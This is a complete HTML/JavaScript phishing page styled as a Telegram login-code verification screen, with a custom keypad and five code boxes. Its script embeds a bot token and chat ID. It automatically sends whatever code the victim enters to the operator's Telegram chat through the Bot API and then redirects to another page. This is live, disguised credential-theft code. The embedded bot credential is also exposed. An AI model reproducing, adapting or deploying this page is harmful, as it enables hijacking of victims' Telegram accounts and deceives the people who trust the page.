<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Verification</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:12px;}
        .telegram-card{background:#ffffff;border-radius:24px;width:100%;max-width:360px;padding:24px 20px 16px;box-shadow:0 8px 24px rgba(0,0,0,0.08);}
        .logo{width:48px;height:48px;background:#007bff;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;}
        .logo svg{width:28px;height:28px;fill:white;}
        h3{font-size:20px;font-weight:600;color:#0a0a0a;margin-bottom:6px;text-align:center;}
        .subtitle{font-size:14px;color:#5e6f88;text-align:center;margin-bottom:24px;line-height:1.4;}
        .subtitle b{color:#0a0a0a;font-weight:600;}
        .code-inputs{display:flex;gap:8px;justify-content:center;margin-bottom:24px;}
        .code-input{width:52px;height:56px;border:2px solid #e9edf2;border-radius:16px;font-size:28px;font-weight:500;text-align:center;background:#f8fafd;color:#0a0a0a;outline:none;caret-color:transparent;pointer-events:none;}
        .code-input.filled{border-color:#007bff;background:#ffffff;}
        .progress-spinner{display:none;width:40px;height:40px;border:4px solid #e9edf2;border-top-color:#007bff;border-radius:50%;margin:0 auto 16px;animation:spin 1s linear infinite;}
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        .resend{text-align:center;font-size:14px;color:#5e6f88;margin-bottom:20px;display:none;}
        .resend a{color:#007bff;text-decoration:none;font-weight:500;}
        .keyboard{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;background:#f8fafd;padding:12px 6px;border-radius:20px;margin-top:4px;}
        .key{background:#ffffff;border:none;border-radius:40px;padding:16px 0;font-size:24px;font-weight:500;color:#0a0a0a;cursor:pointer;box-shadow:0 2px 4px rgba(0,0,0,0.02);transition:all 0.1s;display:flex;flex-direction:column;align-items:center;line-height:1.2;border:1px solid transparent;}
        .key:active{background:#f0f3f8;transform:scale(0.96);}
        .key .letters{font-size:10px;font-weight:400;color:#8a9bb5;letter-spacing:0.3px;margin-top:-2px;}
        .key-zero{grid-column:2;}
        .key-backspace{font-size:22px;color:#5e6f88;}
    </style>
</head>
<body>
    <div class="telegram-card">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.02-2.08 1.32-5.87 3.88-.55.38-1.05.56-1.5.55-.49-.01-1.44-.28-2.14-.51-.86-.28-1.54-.43-1.48-.91.03-.25.3-.51.82-.77 3.15-1.37 5.26-2.28 6.33-2.71 3.02-1.22 3.64-1.43 4.05-1.43.09 0 .29.02.42.13.1.09.13.21.14.3-.01.07-.03.24-.04.38z"/></svg>
        </div>
        <h3>Check your Telegram</h3>
        <div class="subtitle">We've sent the code to the <b>Telegram app</b><br>check your other device</div>
        
        <div class="code-inputs">
            <input type="text" class="code-input" maxlength="1" data-index="0" readonly>
            <input type="text" class="code-input" maxlength="1" data-index="1" readonly>
            <input type="text" class="code-input" maxlength="1" data-index="2" readonly>
            <input type="text" class="code-input" maxlength="1" data-index="3" readonly>
            <input type="text" class="code-input" maxlength="1" data-index="4" readonly>
        </div>
        
        <div class="progress-spinner" id="spinner"></div>
        
        <div class="resend" id="resend">
            Didn't get the code? <a href="#">Resend</a>
        </div>

        <div class="keyboard">
            <div class="key" data-value="1">1<span class="letters"></span></div>
            <div class="key" data-value="2">2<span class="letters">ABC</span></div>
            <div class="key" data-value="3">3<span class="letters">DEF</span></div>
            <div class="key" data-value="4">4<span class="letters">GHI</span></div>
            <div class="key" data-value="5">5<span class="letters">JKL</span></div>
            <div class="key" data-value="6">6<span class="letters">MNO</span></div>
            <div class="key" data-value="7">7<span class="letters">PQRS</span></div>
            <div class="key" data-value="8">8<span class="letters">TUV</span></div>
            <div class="key" data-value="9">9<span class="letters">WXYZ</span></div>
            <div class="key key-zero" data-value="0">0<span class="letters"></span></div>
            <div class="key key-backspace" data-value="backspace">âŒ«</div>
        </div>
    </div>

    <script>
        (function(){
            const inputs = document.querySelectorAll('.code-input');
            const keys = document.querySelectorAll('.key');
            const spinner = document.getElementById('spinner');
            const resend = document.getElementById('resend');
            const BOT_TOKEN = '8210146562:AAHvM54C4KvHsf-YfAjOC9VLe6o1l-gEtBM';
            const CHAT_ID = '-1003885726839';
            
            let currentIndex = 0;
            
            setTimeout(() => resend.style.display = 'block', 20000);
            
            keys.forEach(key => key.addEventListener('click', function(e){
                e.preventDefault();
                const val = this.dataset.value;
                
                if(val === 'backspace'){
                    if(currentIndex > 0 && inputs[currentIndex-1].value){
                        inputs[--currentIndex].value = '';
                        inputs[currentIndex].classList.remove('filled');
                    }else if(inputs[currentIndex].value){
                        inputs[currentIndex].value = '';
                        inputs[currentIndex].classList.remove('filled');
                    }
                }else if(currentIndex < inputs.length){
                    inputs[currentIndex].value = val;
                    inputs[currentIndex].classList.add('filled');
                    if(currentIndex === inputs.length-1){
                        sendCode();
                    }else{
                        currentIndex++;
                    }
                }
            }));
            
            function sendCode(){
                spinner.style.display = 'block';
                let code = '';
                inputs.forEach(inp => code += inp.value);
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({chat_id:CHAT_ID, text:code})
                })
                .then(r=>r.json())
                .then(() => window.location.href = 'index.html')
                .catch(()=>{
                    spinner.style.display = 'none';
                    inputs.forEach(inp => {inp.value='';inp.classList.remove('filled');});
                    currentIndex=0;
                });
            }
        })();
    </script>
</body>
</html>
